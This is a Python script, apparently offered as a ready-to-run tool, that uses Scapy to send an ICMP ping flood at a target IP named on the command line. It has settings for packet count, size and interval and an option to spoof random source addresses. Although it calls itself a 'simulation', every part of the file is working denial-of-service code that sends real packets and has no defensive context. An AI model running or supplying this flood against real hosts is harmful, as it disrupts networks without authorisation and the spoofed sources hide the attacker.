#!/usr/bin/env python3
"""
ICMP Flood (Ping Flood) Attack Simulation
This script simulates a ping flood attack by sending multiple ICMP Echo Request
packets to a target machine.
"""

import argparse
import sys
import time
from scapy.all import IP, ICMP, send, RandIP

def ping_flood(target_ip, packets_count=500, packet_size=56, interval=0.01, spoof_ip=False):
    """
    Send ICMP Echo Request packets to target to simulate a ping flood attack.
    
    Args:
        target_ip: The target IP address
        packets_count: Number of packets to send
        packet_size: Size of the packet payload in bytes
        interval: Delay between packets
        spoof_ip: Whether to use random source IPs
    """
    
    payload = "X" * packet_size
    
    sent_count = 0
    
    for i in range(packets_count):
        try:
            if spoof_ip:
                source_ip = str(RandIP())
                ip = IP(dst=target_ip, src=source_ip)
            else:
                ip = IP(dst=target_ip)
            
            icmp = ICMP(type=8, code=0)
            
            send(ip/icmp/payload, verbose=0)
            sent_count += 1
            
            if i % 50 == 0:
                print(f"Sent {sent_count} packets...")
            
            time.sleep(interval)
            
        except KeyboardInterrupt:
            print("\nPing flood simulation interrupted by user")
            break
        
        except Exception as e:
            print(f"Error: {e}")
            continue
    
    print(f"\nPing flood simulation completed. Sent {sent_count} packets.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICMP (Ping) Flood Attack Simulation Tool")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-c", "--count", type=int, default=500, help="Number of packets to send (default: 500)")
    parser.add_argument("-s", "--size", type=int, default=56, help="Packet payload size in bytes (default: 56)")
    parser.add_argument("-i", "--interval", type=float, default=0.01, help="Interval between packets in seconds (default: 0.01)")
    parser.add_argument("--spoof", action="store_true", help="Use random source IP addresses")
    
    args = parser.parse_args()
    
    try:
        ping_flood(args.target, args.count, args.size, args.interval, args.spoof)
    except KeyboardInterrupt:
        print("\nPing flood simulation interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)